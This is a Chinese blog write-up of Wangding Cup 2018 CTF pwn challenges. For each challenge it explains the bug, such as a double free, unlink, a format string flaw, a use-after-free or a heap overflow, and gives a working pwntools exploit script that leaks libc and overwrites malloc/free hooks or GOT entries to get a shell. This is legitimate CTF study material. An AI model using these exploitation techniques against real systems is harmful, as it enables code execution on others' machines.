---
title: 网鼎杯 2018 Pwn
date: 2020-05-04 11:17:45
tags:
  - 栈漏洞
  - fsb
  - 堆漏洞
categories:
  - 二进制安全
---

准备今年网鼎杯时复现的一些题。题目不是很全，因为有些题不太会。

<!--more-->

## GUESS

题目有三次猜 flag 机会，每次都会 `fork` 出子进程，并且开启了 canary。尝试运行可以发现读取的 flag 放在了栈上，因此我们需要栈地址来泄露 flag，而泄露栈地址需要先泄露 libc。

首先我们可以覆盖 `argv[0]` 为 `puts@got`，借助 `__stack_chk_fail` 函数的报错来泄露 libc。输入任意字符串进入 `strncmp`，在此处下断点，通过 `p &__libc_argv[0]` 可得到 `argv[0]` 地址，然后查看栈得到我们输入的字符串所在地址，两个地址的距离就是我们需要栈溢出的长度，这个长度是 0x128。然后放上 `puts@got` 就能泄露 libc，接下来就能得到 `_environ` 地址。

计算 `_environ` 地址到 `flag` 地址的距离就能得到 flag 真实地址，这个距离是 0x168，我们可以在第三次地址泄露中读到 flag。

```python
def ssp(payload):
    sla('flag', 'a'*0x128 + payload)
    ru('detected ***:')

ssp(p64(elf.got['puts']))
puts = uu64(r(6))

base,libc,system = leak_libc('puts',puts,libc)
env = base + libc.sym['_environ']
ssp(p64(env))
flag = uu64(r(6)) - 0x168

ssp(p64(flag))
```

## blind

本题存在 double free 但没有 show 功能，申请堆块时只能申请 0x68 大小的，这个大小我们喜闻乐见，因为申请到的实际堆块大小为 0x70，而我们一般伪造 chunk size 都是借助 0x7f 来构造。

那么我们可以借助 double free 申请堆块到全局数组的位置，伪造的堆块可以在 `0x602060-0x23` 处找到，然后就可以在全局数组上方再伪造一个 0x100 大小的 chunk，从而绕过 0x68 的限制申请到 small chunk。这里我们将 `ptr[0]` 和 `ptr[2]` 写成 `0x602060`，将 `ptr[4]` 写成 `0x602150`，我们稍后会看到原因。

需要注意的是 `free` 时会检查后两块的 chunk size 是否合法，因此我们同样需要伪造：下一个 chunk 的起始地址为 `0x602050+0x100 = 0x602150`，可以从这里开始伪造 2 个 0x21 的 chunk。这里就是通过 `ptr[4]` 来伪造的。

然后我们释放 0x100 的伪造 chunk，这样在释放时即进入 unsorted bin，覆盖 `ptr[0]` 和 `ptr[1]` 为 `main_arena+88`。释放需要用到一个指向 `0x602060` 的指针，也就是我们之前在 `ptr[0]` 写入的指针。随后进行 partial overwrite，覆盖掉 `ptr[0]` 也就是 `main_arena+88` 的最低 1 字节为 `\x00`，这时 `ptr[0]` 存放的就是 `__malloc_hook-0x10` 的地址，这一步是编辑 `ptr[2]` 处指针指向的内容实现的。

此时再编辑 `ptr[0]` 指向的内容即可写 `__malloc_hook` 为后门函数。

```python
add(0)
add(1)
free(0)
free(1)
free(0)
fake = 0x602060
fake_next = 0x602150
add(2,p64(fake-0x23))
add(3)
add(4)

payload = flat('a'*3,0,0x101,fake,0,fake,0,fake_next,0,0)
add(5, payload)
edit(4,flat(0,0x21,0,0,0,0x21))

free(0) # 0x100
edit(2,'') # \x00, malloc_hook-0x10
system = 0x4008e3
edit(0,'a'*0x10+p64(system))

sla(':',_add)
sla(':',3)
```

## babyheap

本题和上题有点类似，只能分配 0x20 的堆块，漏洞点相同，且多了 show 功能。

首先考虑泄露 libc，我们采用传统的 unsorted bin 泄露大法，这就需要我们伪造 small chunk。为了伪造这个 chunk，首先要泄露堆地址，那么连续释放 2 个 fast chunk，后一个的 fd 就会指向前一个 chunk 的地址，从而可以泄露堆地址。唯一需要注意的是 show 在输出时用的 `puts` 遇到 `\x00` 会截断，所以要注意释放顺序使得泄露出的地址中不存在 `\x00` 字节。

获得堆地址之后，在 chunk0 内伪造 chunk 头造成堆块重叠，然后申请两次就可以申请到一个 `heap+0x20` 处的 chunk，通过写这个 chunk 我们可以写 chunk1 的头部，使得其大小变成 0xa1。随后释放即可泄露 libc，但这里释放时会检查后两个 chunk 的 size，因此我们还需要绕过检查。

绕过的方法是，不断申请 chunk 直到 0xa1 这个 chunk 的末尾，此时申请到的是 chunk4。写入 `0,0x31` 伪造一个 chunk 头；再申请一个 chunk5，写入 `0x30,0x30` 伪造 chunk 头，使得 chunk4 看起来是空闲的。这两步先做好后再释放 chunk1 才能通过检查。

这里让 chunk4 空闲的目的就是为了触发 `unlink` 造成任意地址写，那么显然我们还需要再 chunk4 的内容里添加伪造的 `fd` 和 `bk`，即 `0x602080-0x18` 和 `0x602080-0x10`，这里 `0x602080` 是 `ptr[4]`。`unlink` 之后，我们成功令 `ptr[4]` 指向 `ptr[1]`。现在编辑 chunk4 即可修改 `ptr[1]` 为 `free_hook`，然后编辑 chunk1 即可覆盖 `free_hook` 为 `one_gadget`（`system` 同理）。

```python
add(0)
add(1)
add(2)
add(3)
fd = 0x602080-0x18
bk = 0x602080-0x10
add(4,flat(0,0x31,fd,bk))
add(5,flat(0x30,0x30))

free(1)
free(0)
show(0)
heap = uu64(r(4)) - 0x30
leak('heap',heap)

edit(0,flat(heap+0x20,0,0,0x31))
add(6) # 0
add(7,flat(0,0xa1)) # above 1

free(1)
show(1)
base = uu64(r(6))-88-libc.sym['__malloc_hook']-0x10
leak('base',base)
free_hook = base + libc.sym['__free_hook']

edit(4,p64(free_hook))
edit(1,p64(base+0x4526a))
free(2)
```

## easyfmt

常规的 32 位格式化字符串题，自动化测得偏移为 6，然后泄露 libc，覆盖 `printf@got` 为 `system`。

```python
ru('?\n')
def exec_fmt(payload):
    sl(payload)
    info = r()
    return info
auto = FmtStr(exec_fmt)

sl(p32(elf.got['printf']) + '%6$s')
r(4)
printf = u32(r(4))
leak('printf',printf)
base,libc,system = leak_libc('printf',printf)
sl(fmtstr_payload(auto.offset, {elf.got['printf']:system}))
sl('/bin/sh\x00')
```

## fgo

入门级堆题，直接 uaf 即可。解法可以参考 `hitcontraining_hacknote`。

```python
add(0x20)
add(0x20)
free(0)
free(1)

add(0x8,p32(elf.sym['secret']))
show(0)
```

## soEasy

存在栈溢出，给出了栈地址，checksec 发现 NX 关闭，因此直接写好 shellcode 然后返回到 shellcode 地址即可。

```python
ru('0x')
buf = int(ru('\n'),16)
payload = asm(shellcraft.sh()).ljust(0x4c,'a') + p32(buf)
sla('?',payload)
```

## pesp

编辑时新的 size 并没有作检查，导致可以堆溢出。利用堆溢出修改空闲 fast chunk 的 `fd`，手动造成 uaf，借助假的 `0x7f` 伪造 chunk 分配到 `itemlist` 上方从而修改 `itemlist` 中的内容指针达到任意地址写，泄露 libc 后覆盖 `atoi` 为 `system`。

```python
fake = 0x6020ad
add(0x60)
add(0x60)
free(1)

edit(0,0x100,flat('a'*0x60,0,0x71,fake))
add(0x60) # 1
add(0x60, flat('a'*3, 0x100, elf.got['atoi']))
show()
ru(':')
atoi = uu64(r(6))
base,libc,system = leak_libc('atoi',atoi,libc)
edit(0,0x8,p64(system))
sla(':', '/bin/sh\x00')
```

## semifinal_pwn1

本题功能比较复杂，关键在于自己可以添加自己为好友，然后删除自己时就可以释放内存。而每个用户都会分配一块 0x130 的 chunk，释放后进入 unsorted bin。随后就可以利用 uaf 泄露 libc 并借助 `update` 功能覆盖 got 表。

```python
def reg(size,name):
    sla('choice:',2)
    sla(':',size)
    sla(':',name)
    sla(':',20)
    sla(':','desc')

def login(name):
    sla('choice:',1)
    sla(':',name)

def logout():
    sla('choice:',6)

def add_free(name,choice):
    sla('choice:',3)
    sla(':',name)
    sla('(a/d)', choice)

def view_profile():
    sla('choice:',1)

def edit(name):
    sla('choice:',2)
    sa(':', name)
    sla(':',20)
    sla(':','desc')

reg(8,'a'*6)
reg(8,'b'*6)
login('b'*6)
add_free('b'*6,'a')
add_free('b'*6,'d')

view_profile()
ru('Age:')
base = int(ru('\n'),16)-88-libc.sym['__malloc_hook']-0x10
leak('base',base)
puts = base + libc.sym['puts']

logout()
reg(0x20, p64(elf.got['puts']))
login(p64(puts))
edit(p64(base+0x4526a)[:-2])
```

## semifinal_pwn2

这题比较有意思，程序是一个 brainfuck 解释器，规则是：

- `<`： `p--`
- `>`： `p++`
- `.`： `putc(*p)`
- `,`： `read(0,p,1)`
- `+`： `*p++`
- `-`： `*p--`

换句话说已经可以构造任意地址读写了，那么首先利用上述规则泄露 `stdin` 来泄露 libc，然后用 one_gadget 覆盖 got 表。

```python
stdin = 0x602090
star = 0x6020c0
exit = elf.got['exit']

payload = '<'*(star-stdin) + '.>.>.>.>.>.>'
payload += '<'*(stdin+6-exit) + ',>,>,>,>,>,'
sla(':',payload)
stdin = uu64(r(6))
base = stdin - libc.sym['_IO_2_1_stdin_']
leak('base',base)
one = p64(base + 0xf1147)

for i in range(6):
    s(one[i])
```

## semifinal_pwn3

本题当输入选项为 `1337` 时会调用一个奇怪的函数，但实际上由于 uaf 漏洞的存在这个函数并没有什么用。还有一个比较少见的 `clean` 功能用于清除所有指针，这里是不存在 uaf 的。

我们可以直接 unsorted bin 泄露 libc（这里是通过 `clean` 功能清楚指针，重新申请到释放的 small chunk 后泄露 `bk`），然后 double free 写 `malloc_hook`，最后故意 double free 触发 `malloc_print_err`，调用 `malloc_hook`。

```python
def clean():
    sla('choice :', 4)

add(0x80)
add(0x60)
add(0x60)
free(0)
clean()
add(0x80)
show()
ru('a'*8)
base = uu64(r(6))-88-libc.sym['__malloc_hook']-0x10
leak('base',base)
malloc_hook = base + libc.sym['__malloc_hook']
one = base + 0xf02a4

free(1)
free(2)
free(1)
add(0x60,p64(malloc_hook-0x23))
add(0x60)
add(0x60)
add(0x60,'a'*0x13 + p64(one))

free(0)
free(0) # malloc_print_err
```